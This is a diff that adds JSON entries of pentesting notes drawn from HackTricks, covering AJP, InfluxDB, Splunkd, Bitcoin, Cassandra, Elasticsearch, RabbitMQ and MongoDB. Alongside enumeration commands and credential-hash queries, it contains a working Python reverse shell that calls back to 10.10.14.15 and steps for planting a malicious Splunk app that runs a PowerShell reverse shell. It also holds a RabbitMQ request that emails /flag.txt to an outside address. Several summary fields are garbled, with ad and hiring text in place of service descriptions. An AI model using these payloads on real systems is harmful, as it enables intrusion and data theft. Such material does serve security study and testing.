+   "summary": "​Did you know that crypto projects pay more bounty rewards than their web2 counterparts?\\ This crypto bounty alone is worth $1.000.000!\\ Check out the top-paying bounties among crypto projects.\\ Sign up on HackenProof to get rewarded without delays and become the web3 hacker legend.",
+   "reference": "https://book.hacktricks.wiki/en/network-services-pentesting/8009-pentesting-apache-jserv-protocol-ajp.html",
+   "sections": [
+    {
+     "heading": "Basic Information",
+     "commands": [
+      "PORT     STATE SERVICE\n8009/tcp open  ajp13"
+     ]
+    },
+    {
+     "heading": "Automatic",
+     "commands": [
+      "nmap -sV --script ajp-auth,ajp-headers,ajp-methods,ajp-request -n -p 8009 <IP>"
+     ]
+    },
+    {
+     "heading": "Apache AJP Proxy",
+     "commands": [
+      "sudo apt-get install libapache2-mod-jk\nsudo vim /etc/apache2/apache2.conf # append the following line to the config\n    Include ajp.conf\nsudo vim /etc/apache2/ajp.conf     # create the following file, change HOST to the target address\n    ProxyRequests Off\n    <Proxy *>\n        Order deny,allow\n        Deny from all\n        Allow from localhost\n    </Proxy>\n    ProxyPass       / ajp://HOST:8009/\n    ProxyPassReverse    / ajp://HOST:8009/\nsudo a2enmod proxy_http\nsudo a2enmod proxy_ajp\nsudo systemctl restart apache2",
+      "msf  exploit(tomcat_mgr_deploy) > show options\nModule options (exploit/multi/http/tomcat_mgr_deploy):\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   PASSWORD  tomcat           no        The password for the specified username\n   PATH      /manager         yes       The URI path of the manager app (/deploy and /undeploy will be used)\n   Proxies                    no        Use a proxy chain\n   RHOST     localhost        yes       The target address\n   RPORT     80               yes       The target port\n   USERNAME  tomcat           no        The username to authenticate as\n   VHOST                      no        HTTP server virtual host"
+     ]
+    },
+    {
+     "heading": "Compile Nginx source code with the ajp module",
+     "commands": [
+      "Comment out the entire `server` block and append the following lines inside the `http` block in `/etc/nginx/conf/nginx.conf`.",
+      "Start Nginx and check if everything is working correctly by issuing a cURL request to your local host."
+     ]
+    }
+   ]
+  },
+  {
+   "key": "ht-influxdb",
+   "name": "InfluxDB",
+   "ports": [
+    8086
+   ],
+   "summary": "\\ Use Trickest to easily build and automate workflows powered by the world's most advanced community tools.\\ Get Access Today:",
+   "reference": "https://book.hacktricks.wiki/en/network-services-pentesting/8086-pentesting-influxdb.html",
+   "sections": [
+    {
+     "heading": "Basic Information",
+     "commands": [
+      "PORT     STATE SERVICE VERSION\n8086/tcp open  http    InfluxDB http admin 1.7.5"
+     ]
+    },
+    {
+     "heading": "Try unauthenticated",
+     "commands": [
+      "If you **get an error like** this one: `ERR: unable to parse authentication credentials` it means that it's **expecting some credentials**."
+     ]
+    },
+    {
+     "heading": "Show databases",
+     "commands": [
+      "> show databases\nname: databases\nname\n----\ntelegraf\n_internal"
+     ]
+    },
+    {
+     "heading": "Show tables/measurements",
+     "commands": [
+      "> show measurements\nname: measurements\nname\n----\ncpu\ndisk\ndiskio\nkernel\nmem\nprocesses\nswap\nsystem"
+     ]
+    },
+    {
+     "heading": "Show columns/field keys",
+     "commands": [
+      "> show field keys\nname: cpu\nfieldKey         fieldType\n--------         ---------\nusage_guest      float\nusage_guest_nice float\nusage_idle       float\nusage_iowait     float\nname: disk\nfieldKey     fieldType\n--------     ---------\nfree         integer\ninodes_free  integer\ninodes_total integer\ninodes_used  integer\n[ ... more keys ...]"
+     ]
+    },
+    {
+     "heading": "Dump Table",
+     "commands": [
+      "select * from cpu\nname: cpu\ntime                cpu       host   usage_guest usage_guest_nice usage_idle        usage_iowait        usage_irq usage_nice usage_softirq        usage_steal usage_system        usage_user\n----                ---       ----   ----------- ---------------- ----------        ------------        --------- ---------- -------------        ----------- ------------        ----------\n1497018760000000000 cpu-total ubuntu 0           0                99.297893681046   0                   0         0          0                    0           0.35105315947842414 0.35105315947842414\n1497018760000000000 cpu1      ubuntu 0           0                99.69909729188728 0                   0         0          0                    0           0.20060180541622202 0.10030090270811101"
+     ]
+    },
+    {
+     "heading": "Automated Authentication",
+     "commands": [
+      "msf6 > use auxiliary/scanner/http/influxdb_enum"
+     ]
+    }
+   ]
+  },
+  {
+   "key": "ht-splunkd",
+   "name": "Splunkd",
+   "ports": [
+    8089
+   ],
+   "summary": "Splunk is a log analytics tool used to gather, analyze and visualize data. Though not originally intended to be a SIEM tool, Splunk is often used for security monitoring and business analytics. Splunk deployments are often used to house sensitive data and could provide a wealth of information for an attacker if compromised.",
+   "reference": "https://book.hacktricks.wiki/en/network-services-pentesting/8089-splunkd.html",
+   "sections": [
+    {
+     "heading": "Basic Information",
+     "commands": [
+      "PORT     STATE SERVICE VERSION\n8089/tcp open  http    Splunkd httpd"
+     ]
+    },
+    {
+     "heading": "Create Custom Application",
+     "commands": [
+      "The **`bin`** directory will contain any **scripts that we intend to run** (in this case, a **PowerShell** reverse shell), and the default directory will have our `inputs.conf` file. Our reverse shell will be a **PowerShell one-liner:**",
+      "The [inputs.conf](https://docs.splunk.com/Documentation/Splunk/latest/Admin/Inputsconf) file tells Splunk **which script to run** and any other conditions. Here we set the app as enabled and tell Splunk to run the script every 10 seconds. The interval is always in seconds, and the input (script) will only run if this setting is present.",
+      "We need the `.bat` file, which will run when the application is deployed and execute the PowerShell one-liner.\nThe next step is to choose `Install app from file` and upload the application.\n<figure><img src=\"../.gitbook/assets/image (4) (5) (1).png\" alt=\"\"><figcaption></figcaption></figure>\nBefore uploading the malicious custom app, let's start a listener using Netcat or [socat](https://linux.die.net/man/1/socat)."
+     ]
+    },
+    {
+     "heading": "Linux",
+     "commands": [
+      "import sys,socket,os,pty\nip=\"10.10.14.15\"\nport=\"443\"\ns=socket.socket()\ns.connect((ip,int(port)))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn('/bin/bash')"
+     ]
+    }
+   ]
+  },
+  {
+   "key": "ht-bitcoin",
+   "name": "Bitcoin",
+   "ports": [
+    8333,
+    18333,
+    38333,
+    18444
+   ],
+   "summary": "The port 8333 is used by Bitcoin nodes in the mainnet to communicate between them.  The port 18333 is used Bitcoin nodes in the testnet to communicate between them.  The port 38333 is used Bitcoin nodes in the signet to communicate between them.  The port 18444 is used Bitcoin nodes in the regtest (local) to communicate between them.",
+   "reference": "https://book.hacktricks.wiki/en/network-services-pentesting/8333-18333-38333-18444-pentesting-bitcoin.html",
+   "sections": [
+    {
+     "heading": "Basic Information",
+     "commands": [
+      "PORT      STATE SERVICE\n8333/tcp open  bitcoin"
+     ]
+    },
+    {
+     "heading": "Enumeration",
+     "commands": [
+      "sudo nmap -p 8333 --script bitcoin-info --script bitcoin-getaddr 170.39.103.39\nPORT     STATE SERVICE\n8333/tcp open  bitcoin\n| bitcoin-info:\n|   Timestamp: 2022-04-08T22:33:58\n|   Network: main\n|   Version: 0.7.0\n|   Node Id: 1bea074ea4f6eca3\n|   Lastblock: 731027\n|_  User Agent: /Satoshi:0.19.1/\nsudo nmap -p 8333 --script bitcoin-getaddr 170.39.103.39\nPORT     STATE SERVICE\n8333/tcp open  bitcoin\n| bitcoin-getaddr:\n|   ip                                            timestamp\n|   2a02:c7e:486a:2b00:3d26:db39:537f:59f2:8333   2022-03-25T07:30:45\n|   2600:1f1c:2d3:2403:7b7d:c11c:ca61:f6e2:8333   2022-04-08T07:16:38\n|   75.128.4.27:8333                              2022-04-02T08:10:45\n[...]"
+     ]
+    }
+   ]
+  },
+  {
+   "key": "ht-cassandra",
+   "name": "Cassandra",
+   "ports": [
+    9042,
+    9160
+   ],
+   "summary": "Apache Cassandra is a highly scalable, high-performance distributed database designed to handle large amounts of data across many commodity servers, providing high availability with no single point of failure. It is a type of NoSQL database.\\ In several cases you will find cassandra accepting any credentials (as there aren't any configured) and you will be able to enumerate the database.",
+   "reference": "https://book.hacktricks.wiki/en/network-services-pentesting/cassandra.html",
+   "sections": [
+    {
+     "heading": "Basic Information",
+     "commands": [
+      "PORT     STATE SERVICE   REASON\n9042/tcp open  cassandra-native Apache Cassandra 3.10 or later (native protocol versions 3/v3, 4/v4, 5/v5-beta)\n9160/tcp open  cassandra syn-ack"
+     ]
+    },
+    {
+     "heading": "Manual",
+     "commands": [
+      "pip install cqlsh\ncqlsh <IP>\n#Basic info enumeration\nSELECT cluster_name, thrift_version, data_center, partitioner, native_protocol_version, rack, release_version from system.local;\n#Keyspace enumeration\nSELECT keyspace_name FROM system.schema_keyspaces;\ndesc <Keyspace_name>    #Decribe that DB\ndesc system_auth        #Describe the DB called system_auth\nSELECT * from system_auth.roles;  #Retreive that info, can contain credential hashes\nSELECT * from logdb.user_auth;    #Can contain credential hashes\nSELECT * from logdb.user;\nSELECT * from configuration.\"config\";"
+     ]
+    },
+    {
+     "heading": "Automated",
+     "commands": [
+      "nmap -sV --script cassandra-info -p <PORT> <IP>"
+     ]
+    }
+   ]
+  },
+  {
+   "key": "ht-elasticsearch",
+   "name": "Elasticsearch",
+   "ports": [
+    9200
+   ],
+   "summary": "From the main page you can find some useful descriptions:",
+   "reference": "https://book.hacktricks.wiki/en/network-services-pentesting/9200-pentesting-elasticsearch.html",
+   "sections": [
+    {
+     "heading": "Authentication",
+     "commands": [
+      "curl -X GET \"ELASTICSEARCH-SERVER:9200/_xpack/security/user\"\n{\"error\":{\"root_cause\":[{\"type\":\"exception\",\"reason\":\"Security must be explicitly enabled when using a [basic] license. Enable security by setting [xpack.security.enabled] to [true] in the elasticsearch.yml file and restart the node.\"}],\"type\":\"exception\",\"reason\":\"Security must be explicitly enabled when using a [basic] license. Enable security by setting [xpack.security.enabled] to [true] in the elasticsearch.yml file and restart the node.\"},\"status\":500}",
+      "{\"error\":{\"root_cause\":[{\"type\":\"security_exception\",\"reason\":\"missing authentication credentials for REST request [/]\",\"header\":{\"WWW-Authenticate\":\"Basic realm=\\\"security\\\" charset=\\\"UTF-8\\\"\"}}],\"type\":\"security_exception\",\"reason\":\"missing authentication credentials for REST request [/]\",\"header\":{\"WWW-Authenticate\":\"Basic realm=\\\"security\\\" charset=\\\"UTF-8\\\"\"}},\"status\":401}",
+      "curl -X GET http://user:password@IP:9200/"
+     ]
+    },
+    {
+     "heading": "Basic User Enumeration",
+     "commands": [
+      "#List all roles on the system:\ncurl -X GET \"ELASTICSEARCH-SERVER:9200/_security/role\"\n#List all users on the system:\ncurl -X GET \"ELASTICSEARCH-SERVER:9200/_security/user\"\n#Get more information about the rights of an user:\ncurl -X GET \"ELASTICSEARCH-SERVER:9200/_security/user/<USERNAME>\""
+     ]
+    },
+    {
+     "heading": "Indices",
+     "commands": [
+      "health status index   uuid                   pri rep docs.count docs.deleted store.size pri.store.size\ngreen  open   .kibana 6tjAYZrgQ5CwwR0g6VOoRg   1   0          1            0        4kb            4kb\nyellow open   quotes  ZG2D1IqkQNiNZmi2HRImnQ   5   1        253            0    262.7kb        262.7kb\nyellow open   bank    eSVpNfCfREyYoVigNWcrMw   5   1       1000            0    483.2kb        483.2kb"
+     ]
+    },
+    {
+     "heading": "Write permissions",
+     "commands": [
+      "curl -X POST '10.10.10.115:9200/bookindex/books' -H 'Content-Type: application/json' -d'\n {\n    \"bookId\" : \"A00-3\",\n    \"author\" : \"Sankaran\",\n    \"publisher\" : \"Mcgrahill\",\n    \"name\" : \"how to get a job\"\n }'"
+     ]
+    },
+    {
+     "heading": "Automatic Enumeration",
+     "commands": [
+      "msf > use auxiliary/scanner/elasticsearch/indices_enum"
+     ]
+    }
+   ]
+  },
+  {
+   "key": "ht-rabbitmq-management",
+   "name": "RabbitMQ Management",
+   "ports": [
+    15672
+   ],
+   "summary": "If you are interested in hacking carer and hack the unhackable - we are hiring! (fluent polish written and spoken required).",
+   "reference": "https://book.hacktricks.wiki/en/network-services-pentesting/15672-pentesting-rabbitmq-management.html",
+   "sections": [
+    {
+     "heading": "Enumeration",
+     "commands": [
+      "rabbitmq-plugins enable rabbitmq_management\nservice rabbitmq-server restart",
+      "POST /api/exchanges/%2F/amq.default/publish HTTP/1.1\nHost: 172.32.56.72:15672\nAuthorization: Basic dGVzdDp0ZXN0\nAccept: */*\nContent-Type: application/json;charset=UTF-8\nContent-Length: 267\n{\"vhost\":\"/\",\"name\":\"amq.default\",\"properties\":{\"delivery_mode\":1,\"headers\":{}},\"routing_key\":\"email\",\"delivery_mode\":\"1\",\"payload\":\"{\\\"to\\\":\\\"zevtnax+ppp@gmail.com\\\", \\\"attachments\\\": [{\\\"path\\\": \\\"/flag.txt\\\"}]}\",\"headers\":{},\"props\":{},\"payload_encoding\":\"string\"}"
+     ]
+    }
+   ]
+  },
+  {
+   "key": "ht-mongodb",
+   "name": "MongoDB",
+   "ports": [
+    27017,
+    27018
+   ],
+   "summary": "​Did you know that crypto projects pay more bounty rewards than their web2 counterparts?\\ This crypto bounty alone is worth $1.000.000!\\ Check out the top-paying bounties among crypto projects.\\ Sign up on HackenProof to get rewarded without delays and become the web3 hacker legend.",
+   "reference": "https://book.hacktricks.wiki/en/network-services-pentesting/27017-27018-mongodb.html",
+   "sections": [
+    {
+     "heading": "Basic Information",
+     "commands": [
+      "PORT      STATE SERVICE VERSION\n27017/tcp open  mongodb MongoDB 2.6.9 2.6.9"
+     ]
+    },
+    {
+     "heading": "Manual",
+     "commands": [
+      "from pymongo import MongoClient\nclient = MongoClient(host, port, username=username, password=password)\nclient.server_info() #Basic info\n#If you have admin access you can obtain more info\nadmin = client.admin\nadmin_info = admin.command(\"serverStatus\")\ncursor = client.list_databases()\nfor db in cursor:\n    print(db)\n    print(client[db[\"name\"]].list_collection_names())\n#If admin access, you could dump the database also",
+      "show dbs\nuse <db>\nshow collections\ndb.<collection>.find()  #Dump the collection\ndb.<collection>.count() #Number of records of the collection\ndb.current.find({\"username\":\"admin\"})  #Find in current db the username admin"
+     ]
+    },
+    {
+     "heading": "Automatic",
+     "commands": [
+      "nmap -sV --script \"mongo* and default\" -p 27017 <IP> #By default all the nmap mongo enumerate scripts are used"
+     ]
+    },
+    {
+     "heading": "Login",
+     "commands": [
+      "mongo <HOST>\nmongo <HOST>:<PORT>\nmongo <HOST>:<PORT>/<DB>\nmongo <database> -u <username> -p '<password>'",
+      "nmap -n -sV --script mongodb-brute -p 27017 <ip>"
+     ]
+    },
+    {
+     "heading": "Brute force",
+     "commands": [
+      "grep \"noauth.*true\" /opt/bitnami/mongodb/mongodb.conf | grep -v \"^#\" #Not needed\ngrep \"auth.*true\" /opt/bitnami/mongodb/mongodb.conf | grep -v \"^#\\|noauth\" #Not needed"
+     ]
+    }
+   ]
+  }
+ ]
+}
